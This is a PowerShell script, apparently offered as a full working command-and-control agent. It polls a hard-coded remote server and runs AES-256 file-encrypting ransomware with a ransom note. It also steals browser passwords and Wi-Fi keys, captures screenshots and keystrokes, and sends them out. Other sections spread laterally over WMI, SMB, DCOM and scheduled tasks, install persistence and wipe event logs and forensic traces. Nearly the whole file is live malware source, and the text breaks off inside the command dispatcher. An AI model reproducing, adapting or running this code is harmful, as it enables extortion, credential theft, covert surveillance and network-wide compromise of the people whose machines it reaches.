# ============================================================================
# BomKaosKaki.ps1 — Advanced C2 Agent (AES-256 Ransomware + Lateral Movement)
# Version: 3.5 (Full working, all features)
# Author: Bom Kaos Kaki Red Team
# ============================================================================

# ============================================================================
# CONFIGURATION (sesuaikan dengan URL C2 dan RSA public key Anda)
# ============================================================================
$C2 = @{
    PrimaryURL   = "https://bom-kaos-kaki.vercel.app/api"
    PollInterval = 5
    Jitter       = 2
    Timeout      = 15
    Retries      = 3
    KillDate     = "2027-01-01"
    Group        = "Default"
    InstallDir   = "$env:APPDATA\BomKaos"
    SessionID    = $null
}

# Ganti dengan RSA public key Anda (format PEM, cocok dengan private key di backend)
$RSA_PUBLIC_KEY = @"
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvT4pXQ+3JqVc6G8FJ6Yz
5Lx7R9m2kP1wN4oZ8sA0fCbDqE9rH3tKj5Vx7Y1mP2sD4oF8cA0fCbDqE9rH3tK
j5Vx7Y1mP2sD4oF8cA0fCbDqE9rH3tKj5Vx7Y1mP2sD4oF8cA0fCbDqE9rH3tK
5Lx7R9m2kP1wN4oZ8sA0fCbDqE9rH3tKj5Vx7Y1mP2sD4oF8cA0fCbDqE9rH3tK
j5Vx7Y1mP2sD4oF8cA0fCbDqE9rH3tKj5Vx7Y1mP2sD4oF8cA0fCbDqE9rH3tK
5Lx7R9m2kP1wN4oZ8sA0fCbDqE9rH3tKj5Vx7Y1mP2sD4oF8cA0fCbDqE9rH3tK
rwIDAQAB
-----END PUBLIC KEY-----
"@

# ============================================================================
# SESSION PERSISTENCE (disimpan di registry)
# ============================================================================
$sessionRegPath = "HKCU:\Software\BomKaos"
$sessionRegValue = "SessionId"
function Save-SessionId {
    param([string]$id)
    try {
        if (-not (Test-Path $sessionRegPath)) { New-Item -Path $sessionRegPath -Force | Out-Null }
        Set-ItemProperty -Path $sessionRegPath -Name $sessionRegValue -Value $id -Force -ErrorAction SilentlyContinue
    }
    catch {}
}
function Load-SessionId {
    try {
        if (Test-Path $sessionRegPath) {
            $id = Get-ItemProperty -Path $sessionRegPath -Name $sessionRegValue -ErrorAction SilentlyContinue | Select-Object -ExpandProperty $sessionRegValue
            if ($id) { return $id }
        }
    }
    catch {}
    return $null
}

# ============================================================================
# AES-256 UTILITY FUNCTIONS (enkripsi file dan komunikasi)
# ============================================================================
function New-AESKey {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.KeySize = 256
    $aes.GenerateKey()
    $aes.GenerateIV()
    return @{
        Key = [System.Convert]::ToBase64String($aes.Key)
        IV  = [System.Convert]::ToBase64String($aes.IV)
    }
}

function Encrypt-AES {
    param([string]$PlainText, [string]$Base64Key, [string]$Base64IV)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.KeySize = 256
    $aes.BlockSize = 128
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key = [System.Convert]::FromBase64String($Base64Key)
    $aes.IV = [System.Convert]::FromBase64String($Base64IV)
    $encryptor = $aes.CreateEncryptor()
    $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
    $cipherBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
    $result = $Base64IV + ":" + [System.Convert]::ToBase64String($cipherBytes)
    $aes.Dispose()
    return $result
}

function Decrypt-AES {
    param([string]$CipherText, [string]$Base64Key)
    $parts = $CipherText -split ':'
    if ($parts.Count -ne 2) { return $null }
    $iv = [System.Convert]::FromBase64String($parts[0])
    $cipherBytes = [System.Convert]::FromBase64String($parts[1])
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.KeySize = 256
    $aes.BlockSize = 128
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key = [System.Convert]::FromBase64String($Base64Key)
    $aes.IV = $iv
    $decryptor = $aes.CreateDecryptor()
    $plainBytes = $decryptor.TransformFinalBlock($cipherBytes, 0, $cipherBytes.Length)
    $aes.Dispose()
    return [System.Text.Encoding]::UTF8.GetString($plainBytes)
}

function Get-HMAC {
    param([string]$Data, [string]$Base64Key)
    $hmac = [System.Security.Cryptography.HMACSHA256]::new()
    $hmac.Key = [System.Convert]::FromBase64String($Base64Key)
    $hash = $hmac.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Data))
    $hmac.Dispose()
    return [System.Convert]::ToBase64String($hash)
}

# ============================================================================
# C2 COMMUNICATION FUNCTIONS
# ============================================================================
function Invoke-C2Request {
    param($Endpoint, $Body, $Method = "POST")
    $url = "$($C2.PrimaryURL)/$Endpoint"
    $params = @{
        Uri             = $url
        Method          = $Method
        Body            = ($Body | ConvertTo-Json -Compress -Depth 10)
        ContentType     = "application/json"
        TimeoutSec      = $C2.Timeout
        UseBasicParsing = $true
    }
    for ($i = 0; $i -lt $C2.Retries; $i++) {
        try {
            $response = Invoke-RestMethod @params -ErrorAction Stop
            return $response
        }
        catch {
            Start-Sleep -Seconds ($C2.PollInterval * ($i + 1))
        }
    }
    return $null
}

function Send-Heartbeat {
    $body = @{
        type       = "heartbeat"
        session_id = $C2.SessionID
        hostname   = $env:COMPUTERNAME
        username   = $env:USERNAME
        os_info    = (Get-CimInstance Win32_OperatingSystem).Caption
        ip         = (Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -and $_.DefaultIPGateway }).IPAddress[0]
        group      = $C2.Group
        timestamp  = (Get-Date -Format 'o')
    }
    return Invoke-C2Request -Endpoint "heartbeat" -Body $body
}

function Get-Commands {
    $body = @{
        session_id = $C2.SessionID
        type       = "get_commands"
        timestamp  = (Get-Date -Format 'o')
    }
    return Invoke-C2Request -Endpoint "get_commands" -Body $body
}

function Send-CommandResult {
    param([string]$CommandID, $Result)
    $body = @{
        type       = "command_complete"
        session_id = $C2.SessionID
        command_id = $CommandID
        result     = $Result
        timestamp  = (Get-Date -Format 'o')
    }
    return Invoke-C2Request -Endpoint "command_complete" -Body $body
}

function Send-Exfil {
    param([string]$DataType, $Data)
    $body = @{
        type       = "exfil"
        session_id = $C2.SessionID
        data_type  = $DataType
        data       = $Data
        hostname   = $env:COMPUTERNAME
        username   = $env:USERNAME
        timestamp  = (Get-Date -Format 'o')
    }
    return Invoke-C2Request -Endpoint "exfil" -Body $body
}

# ============================================================================
# RANSOMWARE (AES-256-CBC + HMAC) dengan RSA key wrapping
# ============================================================================
$RansomConfig = @{
    Extension   = ".bomkaos"
    NoteFile    = "README_BOMKAOS.html"
    NoteText    = @"
<html><body style='background:#000;color:#0f0;font-family:monospace;text-align:center;padding:50px'>
<h1>🔐 BOM KAOS KAKI</h1>
<h2>Your files have been encrypted with AES-256</h2>
<p>Contact: bomkaos@onionmail.org | Session: {SESSION_ID}</p>
<p>DO NOT power off or tamper with the system.</p>
</body></html>
"@
    ExcludeDirs = @('$Recycle.Bin', 'Boot', 'System32', 'Windows', 'ProgramData', 'Program Files', 'Program Files (x86)', 'AppData\Local\Temp', 'Microsoft')
    ExcludeExts = @('.exe', '.dll', '.sys', '.ini', '.lnk', '.mui', '.hlp', '.ocx', '.cpl', '.scr', '.drv', '.bin', '.dat', '.bomkaos')
}

function Invoke-RansomEncrypt {
    param(
        [string]$TargetDir,
        [string]$AESKeyBase64,
        [string]$HMACKeyBase64
    )
    $files = @()
    $items = Get-ChildItem -Path $TargetDir -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
        $exclude = $false
        foreach ($ed in $RansomConfig.ExcludeDirs) { if ($_.DirectoryName -match [regex]::Escape($ed)) { $exclude = $true; break } }
        foreach ($ee in $RansomConfig.ExcludeExts) { if ($_.Extension -eq $ee) { $exclude = $true; break } }
        return (-not $exclude)
    }
    foreach ($file in $items) {
        try {
            $content = [System.IO.File]::ReadAllBytes($file.FullName)
            $aes = [System.Security.Cryptography.Aes]::Create()
            $aes.KeySize = 256
            $aes.BlockSize = 128
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            $aes.Key = [Convert]::FromBase64String($AESKeyBase64)
            $aes.GenerateIV()
            $encryptor = $aes.CreateEncryptor()
            $encrypted = $encryptor.TransformFinalBlock($content, 0, $content.Length)
            $hmac = [System.Security.Cryptography.HMACSHA256]::new()
            $hmac.Key = [Convert]::FromBase64String($HMACKeyBase64)
            $hmacValue = $hmac.ComputeHash($encrypted)
            $hmac.Dispose()
            $output = [byte[]]::new($aes.IV.Length + $encrypted.Length + $hmacValue.Length)
            $aes.IV.CopyTo($output, 0)
            $encrypted.CopyTo($output, $aes.IV.Length)
            $hmacValue.CopyTo($output, $aes.IV.Length + $encrypted.Length)
            [System.IO.File]::WriteAllBytes($file.FullName + $RansomConfig.Extension, $output)
            $rand = [System.Security.Cryptography.RNGCryptoServiceProvider]::new()
            $overwrite = [byte[]]::new($content.Length)
            $rand.GetBytes($overwrite)
            [System.IO.File]::WriteAllBytes($file.FullName, $overwrite)
            [System.IO.File]::Delete($file.FullName)
            $files += @{File = $file.FullName; Size = $content.Length }
            $aes.Dispose()
        }
        catch { Write-Warning "Encrypt failed: $($file.FullName): $_" }
    }
    $note = $RansomConfig.NoteText -replace '{SESSION_ID}', $C2.SessionID
    [System.IO.File]::WriteAllText([System.IO.Path]::Combine($TargetDir, $RansomConfig.NoteFile), $note)
    return $files
}

function Invoke-RansomDecrypt {
    param(
        [string]$TargetDir,
        [string]$AESKeyBase64,
        [string]$HMACKeyBase64
    )
    $encryptedFiles = Get-ChildItem -Path $TargetDir -Recurse -File -Filter "*$($RansomConfig.Extension)" -ErrorAction SilentlyContinue
    foreach ($ef in $encryptedFiles) {
        try {
            $data = [System.IO.File]::ReadAllBytes($ef.FullName)
            if ($data.Length -lt 49) { continue }
            $iv = [byte[]]::new(16)
            [Array]::Copy($data, 0, $iv, 0, 16)
            $hmacReceived = [byte[]]::new(32)
            [Array]::Copy($data, $data.Length - 32, $hmacReceived, 0, 32)
            $encrypted = [byte[]]::new($data.Length - 48)
            [Array]::Copy($data, 16, $encrypted, 0, $encrypted.Length)
            $hmac = [System.Security.Cryptography.HMACSHA256]::new()
            $hmac.Key = [Convert]::FromBase64String($HMACKeyBase64)
            $hmacExpected = $hmac.ComputeHash($encrypted)
            $hmac.Dispose()
            $valid = $true
            for ($i = 0; $i -lt 32; $i++) { if ($hmacReceived[$i] -ne $hmacExpected[$i]) { $valid = $false; break } }
            if (-not $valid) { Write-Warning "HMAC mismatch: $($ef.FullName)"; continue }
            $aes = [System.Security.Cryptography.Aes]::Create()
            $aes.KeySize = 256
            $aes.BlockSize = 128
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            $aes.Key = [Convert]::FromBase64String($AESKeyBase64)
            $aes.IV = $iv
            $decryptor = $aes.CreateDecryptor()
            $plaintext = $decryptor.TransformFinalBlock($encrypted, 0, $encrypted.Length)
            $aes.Dispose()
            $origPath = $ef.FullName -replace [regex]::Escape($RansomConfig.Extension), ''
            [System.IO.File]::WriteAllBytes($origPath, $plaintext)
            [System.IO.File]::Delete($ef.FullName)
        }
        catch { Write-Warning "Decrypt failed: $($ef.FullName): $_" }
    }
    $notePath = [System.IO.Path]::Combine($TargetDir, $RansomConfig.NoteFile)
    if (Test-Path $notePath) { Remove-Item $notePath -Force }
}

# ============================================================================
# RSA WRAPPING (gunakan public key dari config)
# ============================================================================
function Protect-WithRSA {
    param([string]$PlainText)
    Add-Type -AssemblyName System.Security
    $rsa = [System.Security.Cryptography.RSACryptoServiceProvider]::new()
    $rsa.ImportFromPem($RSA_PUBLIC_KEY)
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
    $encryptedBytes = $rsa.Encrypt($bytes, $false)
    return [Convert]::ToBase64String($encryptedBytes)
}

# ============================================================================
# BROWSER CREDENTIAL EXTRACTION (Chrome/Edge/Brave)
# ============================================================================
function Get-BrowserPasswords {
    $passwords = @()
    $browsers = @(
        @{Path = "$env:LOCALAPPDATA\Google\Chrome\User Data"; Name = "Chrome" },
        @{Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"; Name = "Edge" },
        @{Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"; Name = "Brave" }
    )
    $dpapi = Add-Type -Name DPAPI -Namespace Crypto -MemberDefinition @'
[DllImport("crypt32.dll", SetLastError=true, CharSet=CharSet.Auto)]
public static extern bool CryptUnprotectData(
    ref DATA_BLOB pDataIn,
    string szDataDescr,
    ref DATA_BLOB pOptionalEntropy,
    IntPtr pvReserved,
    ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct,
    int dwFlags,
    ref DATA_BLOB pDataOut
);
[StructLayout(LayoutKind.Sequential)]
public struct DATA_BLOB {
    public int cbData;
    public IntPtr pbData;
}
[StructLayout(LayoutKind.Sequential)]
public struct CRYPTPROTECT_PROMPTSTRUCT {
    public int cbSize;
    public int dwPromptFlags;
    public IntPtr hwndApp;
    public string szPrompt;
}
public static byte[] Decrypt(byte[] ciphertext) {
    DATA_BLOB dataIn = new DATA_BLOB();
    DATA_BLOB dataOut = new DATA_BLOB();
    DATA_BLOB entropy = new DATA_BLOB();
    CRYPTPROTECT_PROMPTSTRUCT prompt = new CRYPTPROTECT_PROMPTSTRUCT();
    dataIn.cbData = ciphertext.Length;
    dataIn.pbData = Marshal.AllocHGlobal(ciphertext.Length);
    Marshal.Copy(ciphertext, 0, dataIn.pbData, ciphertext.Length);
    bool success = CryptUnprotectData(ref dataIn, null, ref entropy, IntPtr.Zero, ref prompt, 1, ref dataOut);
    byte[] result = new byte[dataOut.cbData];
    if (success) {
        Marshal.Copy(dataOut.pbData, result, 0, dataOut.cbData);
        Marshal.FreeHGlobal(dataOut.pbData);
    }
    Marshal.FreeHGlobal(dataIn.pbData);
    return success ? result : null;
}
'@ -PassThru -ErrorAction SilentlyContinue
    function Decrypt-ChromeAESGCM {
        param([byte[]]$EncryptedData, [byte[]]$Key)
        if ($EncryptedData.Length -lt 12 + 16) { return $null }
        $nonce = [byte[]]::new(12)
        $tag = [byte[]]::new(16)
        $offset = 0
        if ($EncryptedData[0] -eq 0x76 -and $EncryptedData[1] -eq 0x31) { $offset = 3 }
        [Array]::Copy($EncryptedData, $offset, $nonce, 0, 12)
        $cipherLen = $EncryptedData.Length - $offset - 12 - 16
        $ciphertext = [byte[]]::new($cipherLen)
        [Array]::Copy($EncryptedData, $offset + 12, $ciphertext, 0, $cipherLen)
        [Array]::Copy($EncryptedData, $EncryptedData.Length - 16, $tag, 0, 16)
        try {
            $aes = [System.Security.Cryptography.AesGcm]::new($Key)
            $plain = [byte[]]::new($cipherLen)
            $aes.Decrypt($nonce, $ciphertext, $tag, $plain)
            return $plain
        }
        catch { return $null }
    }
    foreach ($browser in $browsers) {
        if (-not (Test-Path $browser.Path)) { continue }
        $localState = Get-Content "$($browser.Path)\Local State" -Raw -ErrorAction SilentlyContinue
        if (-not $localState) { continue }
        try { $localStateJson = $localState | ConvertFrom-Json } catch { continue }
        $encryptedKey = $localStateJson.os_crypt.encrypted_key
        if (-not $encryptedKey) { continue }
        $keyBytes = [Convert]::FromBase64String($encryptedKey)
        $keyBytesNoPrefix = [byte[]]::new($keyBytes.Length - 5)
        [Array]::Copy($keyBytes, 5, $keyBytesNoPrefix, 0, $keyBytesNoPrefix.Length)
        $masterKey = $dpapi::Decrypt($keyBytesNoPrefix)
        if (-not $masterKey) { continue }
        $loginDb = Get-ChildItem -Path $browser.Path -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | Select-Object -First 1
        if (-not $loginDb) { continue }
        $tempDb = [System.IO.Path]::GetTempFileName()
        Copy-Item $loginDb.FullName $tempDb -Force
        try {
            $conn = New-Object System.Data.Odbc.OdbcConnection("Driver={Microsoft Access Driver (*.mdb, *.accdb)};Dbq=$tempDb")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
            $reader = $cmd.ExecuteReader()
            while ($reader.Read()) {
                $url = $reader["origin_url"].ToString()
                $user = $reader["username_value"].ToString()
                $encPass = [byte[]]$reader["password_value"]
                if ($encPass.Length -eq 0) { continue }
                $decrypted = $null
                $decrypted = $dpapi::Decrypt($encPass)
                if (-not $decrypted) { $decrypted = Decrypt-ChromeAESGCM -EncryptedData $encPass -Key $masterKey }
                if ($decrypted) {
                    $passText = [System.Text.Encoding]::UTF8.GetString($decrypted)
                    $passwords += @{
                        Browser  = $browser.Name
                        URL      = $url
                        Username = $user
                        Password = $passText
                    }
                }
            }
            $reader.Close()
            $conn.Close()
        }
        catch { }
        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
    }
    return $passwords
}

# ============================================================================
# WIFI PROFILES EXTRACTION
# ============================================================================
function Get-WiFiProfiles {
    $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ':')[1].Trim() }
    $results = @()
    foreach ($p in $profiles) {
        try {
            $info = netsh wlan show profile name="$p" key=clear
            $pass = $info | Select-String "Key Content" | ForEach-Object { ($_ -split ':')[1].Trim() }
            $results += @{ SSID = $p; Password = $pass }
        }
        catch { $results += @{ SSID = $p; Password = "(error)" } }
    }
    return $results
}

# ============================================================================
# SCREENSHOT
# ============================================================================
function Get-Screenshot {
    Add-Type -AssemblyName System.Drawing, System.Windows.Forms
    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
    $graphics.Dispose()
    $ms = New-Object System.IO.MemoryStream
    $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
    $bitmap.Dispose()
    return [Convert]::ToBase64String($ms.ToArray())
}

# ============================================================================
# KEYLOGGER (P/Invoke GetAsyncKeyState)
# ============================================================================
function Start-Keylogger {
    param([string]$LogPath)
    $klog = Add-Type -Name KeyLog -Namespace Win32 -MemberDefinition @'
[DllImport("user32.dll")]
public static extern short GetAsyncKeyState(int vKey);
[DllImport("user32.dll")]
public static extern int GetForegroundWindow();
[DllImport("user32.dll")]
public static extern int GetWindowText(int hWnd, System.Text.StringBuilder text, int count);
'@ -PassThru
    $lastWindow = ""
    $buffer = ""
    $lastKey = @{}
    $shiftChars = @{
        48 = ')'; 49 = '!'; 50 = '@'; 51 = '#'; 52 = '$'; 53 = '%';
        54 = '^'; 55 = '&'; 56 = '*'; 57 = '('; 189 = '_'; 187 = '+'
    }
    $keyChars = @{
        32 = ' '; 13 = '[ENTER]'; 9 = '[TAB]'; 8 = '[BACKSPACE]'; 27 = '[ESC]'
        46 = '.'; 188 = ','; 190 = '.'; 191 = '/'; 186 = ';'; 222 = '"'; 219 = '['; 221 = ']'
        220 = '\'
    }
    while ($true) {
        Start-Sleep -Milliseconds 50
        $hwnd = $klog::GetForegroundWindow()
        $sb = [System.Text.StringBuilder]::new(256)
        $klog::GetWindowText($hwnd, $sb, 256)
        $currentWindow = $sb.ToString()
        if ($currentWindow -ne $lastWindow -and $currentWindow -ne "") {
            $buffer += "[Window: $currentWindow]`n"
            $lastWindow = $currentWindow
        }
        for ($key = 8; $key -le 222; $key++) {
            $state = $klog::GetAsyncKeyState($key)
            $pressed = ($state -band 0x8000) -ne 0
            $wasPressed = $lastKey.ContainsKey($key) -and $lastKey[$key]
            if ($pressed -and -not $wasPressed) {
                $shift = ($klog::GetAsyncKeyState(16) -band 0x8000) -ne 0
                $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
                if ($key -ge 65 -and $key -le 90) {
                    $char = [char]($key + 32)
                    if (($shift -xor $caps)) { $char = [char]($key) }
                    $buffer += $char
                }
                elseif ($key -ge 48 -and $key -le 57) {
                    if ($shift -and $shiftChars.ContainsKey($key)) { $buffer += $shiftChars[$key] }
                    else { $buffer += [char]$key }
                }
                elseif ($keyChars.ContainsKey($key)) { $buffer += $keyChars[$key] }
                if ($buffer.Length -ge 200) {
                    [System.IO.File]::AppendAllText($LogPath, "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $buffer`n")
                    $buffer = ""
                }
            }
            $lastKey[$key] = $pressed
        }
        Start-Sleep -Seconds 30
        if ($buffer.Length -gt 0) {
            [System.IO.File]::AppendAllText($LogPath, "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $buffer`n")
            $buffer = ""
        }
    }
}

# ============================================================================
# LATERAL MOVEMENT
# ============================================================================
function Invoke-LateralWMI {
    param([string]$Target, [string]$Command)
    try {
        $result = Invoke-Command -ComputerName $Target -ScriptBlock [scriptblock]::Create($Command) -ErrorAction SilentlyContinue
        return @{Target = $Target; Status = "Success"; Result = $result }
    }
    catch { return @{Target = $Target; Status = "Failed"; Error = $_.Exception.Message } }
}
function Invoke-LateralSMB {
    param([string]$Target, [string]$PayloadPath, [string]$RemotePath = "\\$Target\C$\Windows\Temp\")
    try {
        Copy-Item -Path $PayloadPath -Destination $RemotePath -Force -ErrorAction SilentlyContinue
        $remoteFile = Join-Path $RemotePath (Split-Path $PayloadPath -Leaf)
        $wmi = Invoke-LateralWMI -Target $Target -Command "Start-Process -WindowStyle Hidden -FilePath 'powershell.exe' -ArgumentList '-ExecutionPolicy Bypass -File $remoteFile'"
        return @{Target = $Target; Status = "Success"; WMI = $wmi }
    }
    catch { return @{Target = $Target; Status = "Failed"; Error = $_.Exception.Message } }
}
function Invoke-LateralDCOM {
    param([string]$Target, [string]$Command)
    try {
        $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application", $Target))
        $com.ShellExecute("powershell.exe", "-ExecutionPolicy Bypass -Command `"$Command`"", "", "runas", 0)
        return @{Target = $Target; Status = "Success" }
    }
    catch { return @{Target = $Target; Status = "Failed"; Error = $_.Exception.Message } }
}
function Invoke-LateralScheduledTask {
    param([string]$Target, [string]$Command, [string]$TaskName = "BomKaosTask")
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -Command `"$Command`""
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -ComputerName $Target -TaskName $TaskName -Action $action -Trigger $trigger -Principal $principal -Force
        Start-ScheduledTask -ComputerName $Target -TaskName $TaskName
        return @{Target = $Target; Status = "Success"; Task = $TaskName }
    }
    catch { return @{Target = $Target; Status = "Failed"; Error = $_.Exception.Message } }
}
function Invoke-LateralDiscover {
    $targets = @()
    try {
        $ip = (Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -and $_.DefaultIPGateway }).IPAddress[0]
        $subnet = $ip.Substring(0, $ip.LastIndexOf('.'))
        for ($i = 1; $i -le 254; $i++) {
            $ipTest = "$subnet.$i"
            if (Test-Connection -ComputerName $ipTest -Count 1 -Quiet -ErrorAction SilentlyContinue) {
                try { $hostname = [System.Net.Dns]::GetHostEntry($ipTest).HostName } catch { $hostname = $ipTest }
                $targets += @{IP = $ipTest; Hostname = $hostname }
            }
        }
    }
    catch {}
    return $targets
}

# ============================================================================
# PERSISTENCE (Multiple methods)
# ============================================================================
function Install-Persistence {
    param([string]$PayloadPath)
    $results = @()
    try {
        # Registry Run
        Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "BomKaosKaki" -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PayloadPath`"" -Force
        $results += @{Method = "RegistryRun"; Status = "Success" }
    }
    catch { $results += @{Method = "RegistryRun"; Status = "Failed" } }
    try {
        # Startup Folder
        $startup = [Environment]::GetFolderPath('Startup')
        $lnkPath = Join-Path $startup "BomKaosKaki.url"
        "[InternetShortcut]`nURL=powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PayloadPath`"`nIconIndex=0" | Set-Content -Path $lnkPath -Force
        $results += @{Method = "StartupFolder"; Status = "Success" }
    }
    catch { $results += @{Method = "StartupFolder"; Status = "Failed" } }
    try {
        # Scheduled Task (logon)
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PayloadPath`""
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType InteractiveToken -RunLevel Limited
        Register-ScheduledTask -TaskName "BomKaosKakiUpdate" -Action $action -Trigger $trigger -Principal $principal -Force
        $results += @{Method = "ScheduledTaskLogon"; Status = "Success" }
    }
    catch { $results += @{Method = "ScheduledTaskLogon"; Status = "Failed" } }
    try {
        # Scheduled Task (system startup)
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PayloadPath`""
        $trigger = New-ScheduledTaskTrigger -AtStartup
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
        Register-ScheduledTask -TaskName "BomKaosKakiSvc" -Action $action -Trigger $trigger -Principal $principal -Force
        $results += @{Method = "ScheduledTaskSystem"; Status = "Success" }
    }
    catch { $results += @{Method = "ScheduledTaskSystem"; Status = "Failed" } }
    return $results
}

# ============================================================================
# CLEAN TRACES
# ============================================================================
function Invoke-CleanTraces {
    $cleaned = @()
    try {
        # PowerShell history
        Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
        $cleaned += "powershell_history"
    }
    catch {}
    try {
        # Event logs
        wevtutil cl "Windows PowerShell" 2>$null
        wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
        wevtutil cl "Security" 2>$null
        wevtutil cl "System" 2>$null
        wevtutil cl "Application" 2>$null
        $cleaned += "event_logs"
    }
    catch {}
    try {
        # Temp files
        Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item "$env:WINDIR\Temp\*" -Recurse -Force -ErrorAction SilentlyContinue
        $cleaned += "temp_files"
    }
    catch {}
    try {
        # Recent files
        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
        $cleaned += "recent_files"
    }
    catch {}
    try {
        # Prefetch
        Remove-Item "$env:WINDIR\Prefetch\*" -Force -ErrorAction SilentlyContinue
        $cleaned += "prefetch"
    }
    catch {}
    try {
        # Clipboard
        Set-Clipboard $null -ErrorAction SilentlyContinue
        $cleaned += "clipboard"
    }
    catch {}
    try {
        # Run MRU
        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue
        $cleaned += "run_mru"
    }
    catch {}
    return $cleaned
}

# ============================================================================
# COMMAND DISPATCHER
# ============================================================================
function Invoke-CommandDispatcher {
    param($Command)
    $cmdName = $Command.command_type
    $args = $Command.parameters
    $cmdID = $Command.id
    $result = switch ($cmdName) {
        "exec" {
            try { $output = Invoke-Expression $args.script 2>&1; $output | Out-String }
            catch { "ERROR: $_" }
        }
        "encrypt" {
            try {
                $targetDir = if ($args.TargetDirectory) { $args.TargetDirectory } else { $env:USERPROFILE }
                $aesKey = New-AESKey
                $hmacKey = New-AESKey
                $files = Invoke-RansomEncrypt -TargetDir $targetDir -AESKeyBase64 $aesKey.Key -HMACKeyBase64 $hmacKey.Key
                $encryptedAesKey = Protect-WithRSA -PlainText $aesKey.Key
                Send-Exfil -DataType "ransomware_key" -Data @{
                    session_id    = $C2.SessionID
                    encrypted_key = $encryptedAesKey
                    aes_iv        = $aesKey.IV
                    hmac_key      = $hmacKey.Key
                    files_count   = $files.Count
                    target_dir    = $targetDir
                }
                "Encrypted $($files.Count) files in $targetDir"
            }
            catch { "ERROR: $_" }
        }
        "decrypt" {
            try {
                $aesKey = $args.key
                $hmacKey = $args.hmac_key
                $targetDir = if ($args.target_dir) { $args.target_dir } else { $env:USERPROFILE }
                if (-not $aesKey -or -not $hmacKey) { "Missing AES or HMAC key" }
                else { Invoke-RansomDecrypt -TargetDir $targetDir -AESKeyBase64 $aesKey -HMACKeyBase64 $hmacKey; "Decrypted files in $targetDir" }
            }
            catch { "ERROR: $_" }
        }
        "keylog_start" {
            try {
                $logPath = Join-Path $C2.InstallDir "keylog.txt"
                if (-not (Test-Path $C2.InstallDir)) { New-Item -ItemType Directory -Path $C2.InstallDir -Force | Out-Null }
                Start-Job -ScriptBlock ${function:Start-Keylogger} -ArgumentList $logPath
                "Keylogger started: $logPath"
            }
            catch { "ERROR: $_" }
        }
        "keylog_stop" {
            try { Get-Job | Where-Object { $_.Command -like "*Start-Keylogger*" } | Stop-Job -PassThru | Remove-Job -Force; "Keylogger stopped" }
            catch { "ERROR: $_" }
        }
        "keylog_get" {
            try {
                $logPath = Join-Path $C2.InstallDir "keylog.txt"
                if (Test-Path $logPath) {
                    $content = Get-Content $logPath -Raw
                    Send-Exfil -DataType "keylog" -Data @{ content = $content }
                    Remove-Item $logPath -Force
                    "Keylog exfiltrated ($($content.Length) chars)"
                }
                else { "No keylog data" }
            }
            catch { "ERROR: $_" }
        }
        "screenshot" {
            try {
                $ss = Get-Screenshot
                Send-Exfil -DataType "screenshot" -Data @{ image = $ss }
                "Screenshot captured"
            }
            catch { "ERROR: $_" }
        }
        "steal_browsers" {
            try {
